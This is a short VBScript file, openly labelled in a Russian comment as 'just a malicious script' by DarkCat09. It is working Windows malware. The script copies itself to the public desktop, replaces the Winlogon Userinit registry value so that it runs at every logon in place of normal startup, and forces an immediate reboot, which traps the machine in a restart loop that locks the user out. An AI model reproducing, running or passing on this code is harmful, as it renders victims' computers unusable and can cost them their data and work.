' Просто вредоносный скрипт
' by DarkCat09

Dim Wsh, Fso
Set Wsh = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

Dim sysdrive, sysdir
sysdrive = Fso.GetSpecialFolder(0).Drive
sysdir = Fso.GetSpecialFolder(1)

If Not Fso.FileExists(sysdrive & "\Users\Public\Desktop\winrestart.vbs") Then
Fso.CopyFile WScript.ScriptFullName, sysdrive & "\Users\Public\Desktop\winrestart.vbs"
End If

Wsh.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", _
sysdir & "\wscript.exe " & sysdrive & "\Users\Public\Desktop\winrestart.vbs,", "REG_SZ"

Wsh.Run "shutdown /r /t 0", 1, False
